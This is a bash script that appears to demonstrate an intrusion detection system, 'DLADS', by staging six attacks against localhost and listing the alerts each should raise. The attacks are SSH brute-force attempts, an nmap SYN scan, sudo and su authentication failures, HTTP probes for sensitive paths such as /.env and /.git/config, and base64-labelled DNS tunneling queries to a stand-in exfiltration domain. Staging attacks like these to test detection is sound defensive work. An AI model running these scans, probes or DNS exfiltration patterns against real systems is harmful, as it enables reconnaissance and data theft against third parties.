#!/bin/bash
# =============================================================================
# DLADS Attack Script
# Real attacks that generate real log entries on Ubuntu
#
# Attacks 1-2: Both IDS detect  (SSH brute force + port scan)
# Attacks 3-4: Builtin only     (priv esc + multi-service auth)
# Attacks 5-6: Suricata only    (HTTP scan + DNS exfil probe)
# =============================================================================

MY_IP="127.0.0.1"

RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

step() { echo -e "\n${CYAN}── $* ──${NC}"; }
hit()  { echo -e "  ${RED}►${NC} $*"; }
ok()   { echo -e "  ${GREEN}✓${NC} $*"; }

echo -e "${CYAN}"
echo "============================================="
echo "  DLADS Attack Demo"
echo "  6 attacks — 2 both, 2 builtin, 2 suricata"
echo "============================================="
echo -e "${NC}"
sleep 1

# ── Attack 1: SSH Brute Force [BOTH IDS] ─────────────────────────────────────
# Real SSH failures → auth.log → builtin rule engine: SSH_BRUTE_FORCE_001
# TCP SYN floods on port 22 → Suricata: ET SCAN SSH BruteForce
step "ATTACK 1/6 — SSH Brute Force  [Builtin + Suricata]"
echo "    Performing 12 real failed SSH logins to localhost..."
for i in $(seq 1 12); do
    ssh -4 \
        -o BatchMode=yes \
        -o ConnectTimeout=2 \
        -o StrictHostKeyChecking=no \
        -o PreferredAuthentications=password \
        -o PasswordAuthentication=no \
        attacker_dlads@"$MY_IP" 2>/dev/null || true
    hit "SSH failure $i/12"
    sleep 0.4
done
ok "Expect: SSH_BRUTE_FORCE_001 (builtin) + ET SCAN SSH (suricata)"
sleep 3

# ── Attack 2: Port Scan [BOTH IDS] ───────────────────────────────────────────
# nmap real SYN scan → Suricata: ET SCAN Nmap
# nmap also triggers auth.log UFW entries → builtin PORT_SCAN_001
step "ATTACK 2/6 — Port Scan  [Builtin + Suricata]"
if command -v nmap &>/dev/null; then
    echo "    Running nmap SYN scan on localhost..."
    sudo nmap -sS -T4 -p 1-500 "$MY_IP" -oN /dev/null 2>/dev/null &
    NMAP_PID=$!
    hit "nmap scanning ports 1-500 on $MY_IP"
    sleep 5
    wait $NMAP_PID 2>/dev/null
    ok "Expect: PORT_SCAN_001 (builtin via UFW logs) + ET SCAN Nmap (suricata)"
else
    hit "nmap not installed — run: sudo apt install nmap"
fi
sleep 2

# ── Attack 3: Privilege Escalation [BUILTIN ONLY] ────────────────────────────
# Real PAM sudo session → auth.log → builtin PRIV_ESC_001
# Suricata is blind — this is host-level, not network traffic
step "ATTACK 3/6 — Privilege Escalation  [Builtin ONLY]"
echo "    Triggering real sudo auth failures..."
# Generate a real sudo auth failure by trying wrong password
echo "wrongpassword" | sudo -S id 2>/dev/null || true
# Also try su to nonexistent user — generates PAM auth failure
su -c "whoami" dlads_ghost_user_$(date +%s) 2>/dev/null || true
hit "sudo auth failure triggered"
hit "su nonexistent user triggered"
ok "Expect: PRIV_ESC_001 (builtin only) — Suricata blind to PAM events"
sleep 3

# ── Attack 4: Multi-Service Auth Spray [BUILTIN ONLY] ────────────────────────
# Same IP failing on SSH + sudo + other services → MULTI_SERVICE_AUTH_001
# Suricata blind — these are host auth events not packet patterns
step "ATTACK 4/6 — Multi-Service Auth Spray  [Builtin ONLY]"
echo "    Multiple SSH failures from same source..."
for i in $(seq 1 5); do
    ssh -4 \
        -o BatchMode=yes \
        -o ConnectTimeout=2 \
        -o StrictHostKeyChecking=no \
        -o PreferredAuthentications=password \
        -o PasswordAuthentication=no \
        spray_user@"$MY_IP" 2>/dev/null || true
    sleep 0.3
done
echo "wrongpassword" | sudo -S id 2>/dev/null || true
hit "SSH + sudo auth failures from same source"
ok "Expect: MULTI_SERVICE_AUTH_001 (builtin only)"
sleep 3

# ── Attack 5: HTTP Directory Scan [SURICATA ONLY] ─────────────────────────────
# Nikto-style HTTP probes → Suricata: ET SCAN
# Nothing lands in auth.log — builtin rule engine blind
step "ATTACK 5/6 — HTTP Directory Scan  [Suricata ONLY]"
echo "    Sending Nikto-style HTTP probes..."
for path in /admin /.env /wp-admin /phpmyadmin /.git/config \
            /backup.sql /config.php /.htaccess /shell.php \
            /server-status /.svn/entries /manager/html; do
    curl -s -m 2 \
         -A "Mozilla/5.0 (compatible; Nikto/2.1.6)" \
         "http://$MY_IP$path" \
         -o /dev/null 2>/dev/null || true
    hit "HTTP probe → $path"
    sleep 0.15
done
ok "Expect: ET SCAN Nikto (suricata only) — proves network-layer IDS value"
sleep 2

# ── Attack 6: DNS Exfiltration Probe [SURICATA ONLY] ─────────────────────────
# Long encoded DNS queries → Suricata: ET DNS tunneling signatures
# No auth.log entry — builtin rule engine completely blind
step "ATTACK 6/6 — DNS Exfiltration Probe  [Suricata ONLY]"
if command -v dig &>/dev/null; then
    echo "    Sending suspicious DNS queries..."
    for label in \
        "aGVsbG8td29ybGQtdGhpcy1pcy1hLXRlc3Q" \
        "dGhpcy1pcy1hLWxvbmctZG5zLXR1bm5lbA" \
        "ZXhmaWx0cmF0aW9uLXRlc3QtZGF0YQ" \
        "c2Vuc2l0aXZlZGF0YTEyMzQ1Njc4OTA"; do
        dig +short +time=1 "${label}.exfil-test.example.com" \
            @8.8.8.8 > /dev/null 2>&1 || true
        hit "DNS probe: ${label:0:30}..."
        sleep 0.3
    done
    ok "Expect: ET DNS tunneling (suricata only)"
else
    hit "dig not found — run: sudo apt install dnsutils"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo -e "\n${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  All 6 attacks done. Check results:${NC}"
echo ""
echo -e "${YELLOW}    curl -s http://localhost:8080/alerts  | python3 -m json.tool | grep rule_id${NC}"
echo -e "${YELLOW}    curl -s http://localhost:8080/threats | python3 -m json.tool${NC}"
echo ""
echo -e "${CYAN}  Expected detections:${NC}"
echo -e "    ${GREEN}Builtin: ${NC}SSH_BRUTE_FORCE_001, PORT_SCAN_001, PRIV_ESC_001, MULTI_SERVICE_AUTH_001"
echo -e "    ${GREEN}Suricata:${NC}ET SCAN SSH, ET SCAN Nmap, ET SCAN Nikto, ET DNS tunneling"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"